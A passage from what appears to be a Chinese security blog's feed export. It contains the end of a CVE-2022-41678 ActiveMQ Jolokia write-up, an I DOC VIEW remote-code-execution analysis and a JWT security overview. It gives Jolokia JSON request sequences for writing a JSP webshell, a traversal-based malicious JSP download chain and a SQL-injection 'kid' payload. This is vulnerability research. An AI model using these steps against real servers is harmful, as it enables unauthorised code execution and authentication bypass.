title="image-20231201003406901"><p>这里判断了如果你的<code>Origin</code>不符合条件，那么就直接退出，所以访问的时候加上<code>Origin</code>头。<br>加上头之后就能成功访问这些东西了，也就是前面前置知识里那样。<br>通过了解前置知识我们知道了，通过<code>Jolikia</code>可以对<code>MBean</code>进行操作，<code>MBean</code>时<code>JMX</code>中的核心部分，通过<code>MBean</code>可以将JDK级别的服务以接口的方式对外暴露，提供很多功能。<br>在<code>Java11</code>中，新增了一个<code>MBean</code>：<code>jdk.management.jfr.FlightRecorderMXBeanImpl</code><br>对于这个<code>MBean</code>官方也有详细的介绍，想看的师傅可以移步<a href="https://docs.oracle.com/en/java/javase/11/docs/api/jdk.management.jfr/jdk/management/jfr/FlightRecorderMXBean.html">FlightRecorderMXBean (Java SE 11 &amp; JDK 11 )</a>，我在这里就简单介绍一下。<br>newRecording方法用来创建一个新的记录，但是并不会启动它：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">newRecording</span><span class="hljs-params">()</span> &#123;<br>MBeanUtils.checkControl();<br>getRecorder(); <span class="hljs-comment">// ensure notification listener is setup</span><br><span class="hljs-keyword">return</span> AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;Recording&gt;() &#123;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Recording <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Recording</span>();<br>&#125;<br>&#125;, <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">FlightRecorderPermission</span>(<span class="hljs-string">&quot;accessFlightRecorder&quot;</span>)).getId();<br>&#125;<br></code></pre></td></tr></table></figure><p>创建一个录制后并不会开始，要通过<code>startRecording</code>方法来启动这个录制，其中接受的参数就是前面返回的参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startRecording</span><span class="hljs-params">(<span class="hljs-type">long</span> id)</span> &#123;<br>MBeanUtils.checkControl();<br>getExistingRecording(id).start();<br>&#125;<br></code></pre></td></tr></table></figure><p>有启动自然也要停止，通过<code>stopRecording</code>方法停止录制：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">stopRecording</span><span class="hljs-params">(<span class="hljs-type">long</span> id)</span> &#123;<br>MBeanUtils.checkControl();<br><span class="hljs-keyword">return</span> getExistingRecording(id).stop();<br>&#125;<br></code></pre></td></tr></table></figure><p>但是这个开始和结束并不能将<code>webshell</code>地内容放进去，所以我们还需要用<code>setConfiguration</code>将<code>webshell</code>的内容以配置的形式写入，那么配置从哪里来呢，就从<code>getConfigurations</code>来咯：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;ConfigurationInfo&gt; <span class="hljs-title function_">getConfigurations</span><span class="hljs-params">()</span> &#123;<br>        MBeanUtils.checkMonitor();<br>        <span class="hljs-keyword">return</span> MBeanUtils.transformList(Configuration.getConfigurations(), ConfigurationInfo::<span class="hljs-keyword">new</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>copyTo这个方法用来将录制的内容写入指定的文件，也就是我们本次漏洞的最后一步，写入JSP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">copyTo</span><span class="hljs-params">(<span class="hljs-type">long</span> recording, String path)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>Objects.requireNonNull(path);<br>MBeanUtils.checkControl();<br>getExistingRecording(recording).dump(Paths.get(path));<br>&#125;<br></code></pre></td></tr></table></figure><p>官方也写得很明白，在使用的时候这样写就行了：</p><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003418727.png" class="" title="image-20231201003418727"><p>那么利用方式也很清晰了：创建录制–设置配置–启动录制–结束录制–写入文件<br>至于录制的内容就是我们要写入的shell了。<br>那么就开始吧，首先新建一个录制，不需要接受参数，所以我也没加，返回值中的<code>value</code>就是<code>id</code>值：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;exec&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;mbean&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;jdk.management.jfr:type=FlightRecorder&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;operation&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;newRecording&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003423284.png" class="" title="image-20231201003423284"><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003425810.png" class="" title="image-20231201003425810"><p>然后获取配置，看看是什么样的，注意这里用<code>read</code>：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;read&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;mbean&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;jdk.management.jfr:type=FlightRecorder&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;operation&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;getConfigurations&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003429100.png" class="" title="image-20231201003429100"><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003432288.png" class="" title="image-20231201003432288"><p>修改，加入<code>webshell</code>：</p><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003437020.png" class="" title="image-20231201003437020"><p>写入，根据方法接受的参数，第一个是<code>id</code>也就是那个1，第二个就是修改好的配置文件内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;exec&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;mbean&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;jdk.management.jfr:type=FlightRecorder&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;operation&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;setConfiguration&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;arguments&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;xml&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003440454.png" class="" title="image-20231201003440454"><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003443369.png" class="" title="image-20231201003443369"><p>开始&amp;结束录制：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;exec&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;mbean&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;jdk.management.jfr:type=FlightRecorder&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;operation&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;startRecording&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;arguments&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;exec&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;mbean&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;jdk.management.jfr:type=FlightRecorder&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;operation&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;stopRecording&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;arguments&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003446643.png" class="" title="image-20231201003446643"><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003449380.png" class="" title="image-20231201003449380"><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003452343.png" class="" title="image-20231201003452343"><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003455192.png" class="" title="image-20231201003455192"><p>导出文件：</p><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003457991.png" class="" title="image-20231201003457991"><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003500883.png" class="" title="image-20231201003500883"><p>访问一下验证：</p><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003504748.png" class="" title="image-20231201003504748"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉每次有一些底层的大更新有新特性的时候都会出一些安全问题，这次是<code>ActiveMQ 5.16.x</code>开始支持Java11，所以可以从这些方面入手，看看新特性能不能高些事情。<br>此外这个漏洞的利用方式不止JDK的<code>MBean</code>一种，还可以利用一些第三方的<code>MBean</code>来getshell，具体的方式就请师傅们自己研究下啦~</p>]]></content>
    
    
    <categories>
      
      <category>2023_CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>I DOC VIEW 前台RCE</title>
    <link href="/2023/11/24/I%20DOC%20VIEW%20%E5%89%8D%E5%8F%B0RCE/"/>
    <url>/2023/11/24/I%20DOC%20VIEW%20%E5%89%8D%E5%8F%B0RCE/</url>
    
    <content type="html"><![CDATA[<h1 id="I-DOC-VIEW-前台RCE"><a href="#I-DOC-VIEW-前台RCE" class="headerlink" title="I DOC VIEW 前台RCE"></a>I DOC VIEW 前台RCE</h1><p>I DOC VIEW是一个在线的文档查看器，其中的<code>/html/2word</code>接口因为处理不当，导致可以远程读取任意文件，通过这个接口导致服务器下载恶意的JSP进行解析，从而RCE。</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p><code>20231115</code>之前版本</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>先定位到问题接口：</p><img src="/2023/11/24/I%20DOC%20VIEW%20%E5%89%8D%E5%8F%B0RCE/image-20231124002943513.png" class="" title="image-20231124002943513"><p>接口里面就一个方法<code>toWord</code>，那么就来看看它做了什么：</p><img src="/2023/11/24/I%20DOC%20VIEW%20%E5%89%8D%E5%8F%B0RCE/image-20231124002951105.png" class="" title="image-20231124002951105"><p>前面的内容不是特别紧要，这里有一个去爬取页面的方法，也是唯一使用了<code>url</code>参数的地方：</p><img src="/2023/11/24/I%20DOC%20VIEW%20%E5%89%8D%E5%8F%B0RCE/image-20231124002957766.png" class="" title="image-20231124002957766"><p>这里使用了<code>getPage</code>方法来处理<code>obj</code>，而<code>obj</code>又是<code>url</code>来的<code>URL</code>对象，但是疑惑的时文件名只能是<code>index.html</code>所以去看一下这个<code>getWebPage</code>方法：</p><img src="/2023/11/24/I%20DOC%20VIEW%20%E5%89%8D%E5%8F%B0RCE/image-20231124003004867.png" class="" title="image-20231124003004867"><p>其实到上面这里还好，都是一些写文件的操作，并且写的也是<code>index.html</code>但是下面做的操作就是本此漏洞的关键了，软件本意应该是想做一个比较完善的爬虫，所以接下会调用<code>GrabUtility.searchForNewFilesToGrab</code>方法继续解析文件内容，这里的<code>conn</code>也就是刚才创建的链接：</p><img src="/2023/11/24/I%20DOC%20VIEW%20%E5%89%8D%E5%8F%B0RCE/image-20231124003010469.png" class="" title="image-20231124003010469"><p>进入到<code>GrabUtility.searchForNewFilesToGrab</code>查看，发现其中的内容就是解析响应值，其中获取<code>link[href]</code>、<code>script[src]</code>、<code>img[src]</code>标签对应的内容然后存进<code>GrabUtility</code>的成员变量<code>filesToGrab</code>中：</p><img src="/2023/11/24/I%20DOC%20VIEW%20%E5%89%8D%E5%8F%B0RCE/image-20231124003017471.png" class="" title="image-20231124003017471"><img src="/2023/11/24/I%20DOC%20VIEW%20%E5%89%8D%E5%8F%B0RCE/image-20231124003025552.png" class="" title="image-20231124003025552"><p>然后就到了触发漏洞的操作了，这里读取了<code>filesToGrab</code>的<code>size</code>然后开始尝试挨个链接下载了，这里调用了<code>GetWebPage</code>重载方法，目录还是原来的目录，文件名时自动解析的文件名：</p><img src="/2023/11/24/I%20DOC%20VIEW%20%E5%89%8D%E5%8F%B0RCE/image-20231124003032209.png" class="" title="image-20231124003032209"><img src="/2023/11/24/I%20DOC%20VIEW%20%E5%89%8D%E5%8F%B0RCE/image-20231124003039291.png" class="" title="image-20231124003039291"><p>这就好办了，因为程序中只对后缀做了过滤，所以只要我们不是它黑名单的后缀然后再配合<code>目录穿越</code>就行了，然后黑名单是<code>html</code>、<code>htm</code>、<code>php</code>、<code>asp</code>、<code>aspx</code>和<code>net</code>，但是没有<code>jsp</code>，所以只需要写个<code>jsp</code>的🐎就可以了。<br>这里需要注意的是，因为截取<code>/</code>后的内容作为文件名，所以不能使用<code>/</code>进行目录穿越，但是系统是<code>windows</code>上的，所以就可以使用<code>\</code>来代替。<br>那么利用流程就是：首先启动恶意服务器，将服务器的<code>index.html</code>中放入一个<code>href</code>、<code>img</code>或者<code>script</code>定向到<code>jsp</code>马就行了！（这也印证了通告中的<code>诱导</code>下载危险文件)</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>poc我放在了<a href="https://github.com/springkill/idocv_poc">这里</a>，详细分步复现请看下文：</p><p>构造页面：</p><img src="/2023/11/24/I%20DOC%20VIEW%20%E5%89%8D%E5%8F%B0RCE/image-20231124003048041.png" class="" title="image-20231124003048041"><p><code>python</code>启动简易<code>http</code>，访问！<br>然后被杀（谢谢你火绒：</p><img src="/2023/11/24/I%20DOC%20VIEW%20%E5%89%8D%E5%8F%B0RCE/image-20231124003055195.png" class="" title="image-20231124003055195"><p>关了火绒（因为服务貌似会有缓存，所以需要换个端口）：</p><img src="/2023/11/24/I%20DOC%20VIEW%20%E5%89%8D%E5%8F%B0RCE/image-20231124003100746.png" class="" title="image-20231124003100746"><p>测试：</p><img src="/2023/11/24/I%20DOC%20VIEW%20%E5%89%8D%E5%8F%B0RCE/image-20231124003109465.png" class="" title="image-20231124003109465"><p>当然最后不要忘记打开火绒哦。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>文件操作是十分敏感的操作，尤其是向服务器中下载文件，同时下载的文件最好也有固定的目录存放并防止目录穿越，开发者已经想到了下载文件的风险，但是却没有将对策做好，导致了本次漏洞。</p><h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><p>天知道我试了多少次……</p><img src="/2023/11/24/I%20DOC%20VIEW%20%E5%89%8D%E5%8F%B0RCE/image-20231124003114768.png" class="" title="image-20231124003114768">]]></content>
    
    
    <categories>
      
      <category>2023_CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅谈JWT安全</title>
    <link href="/2023/11/22/%E6%B5%85%E8%B0%88JWT%E5%AE%89%E5%85%A8/"/>
    <url>/2023/11/22/%E6%B5%85%E8%B0%88JWT%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="浅谈JWT安全"><a href="#浅谈JWT安全" class="headerlink" title="浅谈JWT安全"></a>浅谈JWT安全</h1><p>JWT是为了解决HTTP会话的状态维持需要频繁查询数据库这一慢操作而产生的，和redis不同，它将大部分（或全部）信息保存在JWT自身中，通过对JWT的解析直接获取会话的状态信息，但是这也产生了一些安全问题。</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><blockquote><p>Json web token (简称JWT)，是目前最流行的跨域认证解决方案，是一种认证授权机制。<br>JWT 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准。该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p></blockquote><h2 id="JWT组成"><a href="#JWT组成" class="headerlink" title="JWT组成"></a>JWT组成</h2><p>JWT 由三部分组成，每部分之间用点<code>.</code>隔开，这三部分分别是<code>header</code>、<code>payload</code>、<code>Signature</code>。<br>我们生成一个JWT来详细观察一下它的结构：<br><code>JWTeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</code>.<code>eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ</code>.<code>MZiW2KkIRI6GhKsu16Me7-3IpS4nBw1W47CW67QAqS0</code><br>正如前面说的一样，JWT分为以<code>.</code>隔开的三段，并且使用了<code>base64url</code>编码进行编码</p><blockquote><p>base64url编码将base64中的<code>+</code>替换为<code>-</code>，将<code>/</code>替换为<code>_</code>并且省略了<code>=</code>，这样主要是为了避免歧义。</p></blockquote><p>解码后的三段数据分别为：<br><code>&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</code><br><code>&#123;&quot;sub&quot;:&quot;1234567890&quot;,&quot;name&quot;:&quot;John Doe&quot;,&quot;iat&quot;:1516239022&#125;</code><br><code>Signature</code></p><img src="/2023/11/22/%E6%B5%85%E8%B0%88JWT%E5%AE%89%E5%85%A8/image-20231122014746811.png" class="" title="image-20231122014746811"><h3 id="header"><a href="#header" class="headerlink" title="header"></a>header</h3><p><code>header</code>中的两个内容很好理解，一个是规定了格式为<code>JWT</code>，另一个指定签名算法为<code>HS256</code>，<code>header</code>中通常也只有这两个字段，其中<code>typ</code>不变，永远都是<code>JWT</code>，<code>alg</code>字段会根据所使用的签名算法不同而改变，有时还会有<code>jwk</code>字段（这个也成为了一个安全问题）。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><code>payload</code>中包含三部分内容：标准中注册的声明、公共的声明和私有的声明。<br>标准中注册的声明：</p><ul><li><code>iss</code>: jwt签发者</li><li><code>sub</code>: jwt所面向的用户</li><li><code>aud</code>: 接收jwt的一方</li><li><code>exp</code>: jwt的过期时间，这个过期时间必须要大于签发时间</li><li><code>nbf</code>: 定义在什么时间之前，该jwt都是不可用的.</li><li><code>iat</code>: jwt的签发时间</li><li><code>jti</code>: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。</li></ul><p>公共的声明 ： 公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密.<br>私有的声明 ： 私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。</p><h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>签名是JWT的最后一部分，生成方式和上面图片中蓝色字段写的一样，其中<code>secret</code>字段是一个密钥，通过这个密钥进行加密后的数据再<code>base64url</code>编码就得到了JWT中的最后一部分内容。</p><h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><p>由于JWT的前两个字段<code>header</code>和<code>payload</code>并没有进行加密，所以直接使用<code>base64url</code>进行解码就可以获得相应的信息，这就可能会造成敏感信息泄露，当然是否有敏感信息还需要看对应的开发者有没有往里面放就是了。</p><h3 id="none签名方法"><a href="#none签名方法" class="headerlink" title="none签名方法"></a>none签名方法</h3><p>这个漏洞应该不会再出现了，java中有个依赖叫什么具体忘记了，其实调试过程还蛮复杂的所以就不上调试流程了。<br>漏洞的成因是因为在签名的生成过程中允许了使用<code>none</code>作为签名算法，当签名算法为<code>none</code>的时候，只需要使用<code>base64url</code>编码<code>header</code>和<code>payload</code>并用<code>.</code>分割，就可以绕过原本的签名检测，达到权限获取的目的。</p><h3 id="签名未校验"><a href="#签名未校验" class="headerlink" title="签名未校验"></a>签名未校验</h3><p>在fusionauth-jwt 1.3.0以前，该组件即使删除了<code>JWT</code>地签名部分仍然可以通过验证。</p><h3 id="不当的错误处理"><a href="#不当的错误处理" class="headerlink" title="不当的错误处理"></a>不当的错误处理</h3><p>在CVE-2019-7644中，如果你发送的签名是错的，那么服务器会通知你签名错误，并返回一个正确的签名（你人还怪好的嘞）。</p><h3 id="破解密钥"><a href="#破解密钥" class="headerlink" title="破解密钥"></a>破解密钥</h3><p>猜您是否在找：<br><a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a><br><a href="https://github.com/Ch1ngg/JWTPyCrack">https://github.com/Ch1ngg/JWTPyCrack</a><br><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p><h3 id="更改加密算法"><a href="#更改加密算法" class="headerlink" title="更改加密算法"></a>更改加密算法</h3><p>在CVE-2016-10555中，jwt-simple &lt; 0.3.0版本，如果将<code>header</code>中的签名算法由<code>RS256</code>改为<code>HS256</code>那么就会执行对称加密解密算法，将<code>RS256</code>的公钥用作对称解密当中。</p><h3 id="伪造密钥"><a href="#伪造密钥" class="headerlink" title="伪造密钥"></a>伪造密钥</h3><p>在CVE-2018-0114中，通过前文说到的<code>header</code>中的<code>jwk</code>字段可以伪造公钥（自己生成的），然后用对应的私钥进行加密操作并发送，对方就会使用传输的公钥来进行解密，绕过安全认证。</p><h3 id="硬编码"><a href="#硬编码" class="headerlink" title="硬编码"></a>硬编码</h3><p>尤其是对于开源项目，如果使用了硬编码存储公钥私钥，并且开发者使用了默认的硬编码私钥，那么就会破坏原本的身份验证机制。</p><h3 id="header中web安全问题"><a href="#header中web安全问题" class="headerlink" title="header中web安全问题"></a>header中web安全问题</h3><p>常见的是<code>header</code>中的<code>kid</code>字段：</p><ul><li>由于<code>kid</code>通常用于从文件系统检索密钥文件，因此如果在使用前未对其进行过滤，可能会导致目录遍历攻击。在这种情况下，攻击者将能够指定文件系统中的任何文件作为用于验证令牌的密钥。</li><li><code>kid</code>还可用于从数据库检索密钥。在这种情况下，可以利用 SQL 注入来绕过 JWT 签名。</li></ul><p>如果<code>kid</code>参数上可以进行 SQL 注入，则攻击者可以使用此注入返回任何值。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss">sql注入“kid”：“aaaaaaa&#x27; <span class="hljs-built_in">UNION</span> <span class="hljs-built_in">SELECT</span> &#x27;<span class="hljs-built_in">key</span>&#x27;;--”<br><span class="hljs-comment">// 使用字符串“key”来验证令牌</span><br></code></pre></td></tr></table></figure><p>例如，上面的注入将导致应用程序返回字符串<code>key</code>，然后将使用字符串<code>key</code>作为密钥来验证令牌。</p><ul><li>如果<code>kid</code>的值被拼接到命令中用来读取文件，那么就有可能产生和<code>web</code>中其他内容同样会产生的命令注入。</li></ul><h2 id="漏洞近况"><a href="#漏洞近况" class="headerlink" title="漏洞近况"></a>漏洞近况</h2><p>谷歌搜索了一下感觉JWT引发的问题还是蛮多的，比如：<br>硬编码的CVE-2023-5074、CVE-2023-33236这两个漏洞可以通过硬编码的密钥伪造任意JWT<br>JWT报错产生的CVE-2023-40171和前面说的<code>不当的错误处理</code>一样，当你传输了错误的内容时会返回给一个正确签名的JWT<br>因为验证不当导致的CVE-2023–4696属于前面说的<code>签名未校验</code>类型，修改<code>payload</code>中的明文信息就可以绕过权限检查<br>因为输入过滤不当导致的CVE-2022-23529，该漏洞允许通过JWT重写<code>toString</code>方法造成RCE（不过作者本人似乎说不能RCE，只能本地利用，这里贴个图）</p><img src="/2023/11/22/%E6%B5%85%E8%B0%88JWT%E5%AE%89%E5%85%A8/image-20231122014756560.png" class="" title="image-20231122014756560"><h2 id="IAST的检测"><a href="#IAST的检测" class="headerlink" title="IAST的检测"></a>IAST的检测</h2><p>对于使用IAST检测JWT问题想了一天也没什么通用的头绪，DongTai老大哥的代码中貌似也没看到什么有用的内容，记录下自己的思考吧。</p><h4 id="JWT生成点"><a href="#JWT生成点" class="headerlink" title="JWT生成点"></a>JWT生成点</h4><p>桩点：寻找代码中生成JWT的部分，通常是在用户认证成功后。<br>实施方案：在这些点插入代码，用以检查所使用的算法（避免None），确保密钥的强度和安全性。同时，记录生成的JWT，以便于后续审计。</p><h4 id="JWT解析与验证点"><a href="#JWT解析与验证点" class="headerlink" title="JWT解析与验证点"></a>JWT解析与验证点</h4><p>桩点：找到解析和验证JWT的部分，通常是在API访问控制或用户会话管理中。<br>实施方案：在JWT解析和验证的代码处插入检测逻辑，确保签名的有效性，防止伪造或篡改。同时，检查负载中的标准声明，如过期时间（exp）、主题（sub）等。</p><h4 id="错误处理与日志记录"><a href="#错误处理与日志记录" class="headerlink" title="错误处理与日志记录"></a>错误处理与日志记录</h4><p>桩点：在处理JWT相关异常的地方，如签名验证失败、令牌过期等。<br>实施方案：增强错误处理逻辑，记录所有失败的JWT验证尝试，包括令牌信息和相关的访问上下文，以便于安全分析。</p><h4 id="敏感信息泄露检测"><a href="#敏感信息泄露检测" class="headerlink" title="敏感信息泄露检测"></a>敏感信息泄露检测</h4><p>桩点：在JWT的payload创建过程中。<br>实施方案：确保JWT的负载中不含敏感信息，如用户密码、个人身份信息等。可以在这一点上插入代码，自动检测和警告任何可能的敏感信息泄露。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>因为只是想概括性地了解JWT的安全问题，所以对于其中的代码我也并没有进行调试，只是想给自己留个印象方便需要的时候及时回忆起来，对于JWT来说，存在的安全问题似乎和库以及组件开发者开发时的清醒程度有直接关联（这么说好像有点奇怪）。同时对于使用者来说，在JWT中存放何种信息、使用什么协议传输以及在接收时是否增加一些必要的过滤都是需要考虑的地方。<br>关于JWT还有很多需要学习的，看本文瞎扯一通后，希望读者对JWT安全有一个大致模糊的了解。<br>参考链接：<br><a href="https://research.securitum.com/jwt-json-web-token-security/">https://research.securitum.com/jwt-json-web-token-security/</a><br><a href="https://www.authing.cn/blog/306">https://www.authing.cn/blog/306</a><br><a href="https://version-2.com/en/2023/01/jwt-arbitrary-command-execution-cve-2022-23529/">https://version-2.com/en/2023/01/jwt-arbitrary-command-execution-cve-2022-23529/</a><br><a href="https://medium.com/@mnqazi/cve-2023-4696-account-takeover-due-to-improper-handling-of-jwt-tokens-in-memos-v0-13-2-13104e1412f3">https:&#x2F;&#x2F;medium.com&#x2F;@mnqazi&#x2F;cve-2023-4696-account-takeover-due-to-improper-handling-of-jwt-tokens-in-memos-v0-13-2-13104e1412f3</a><br><a 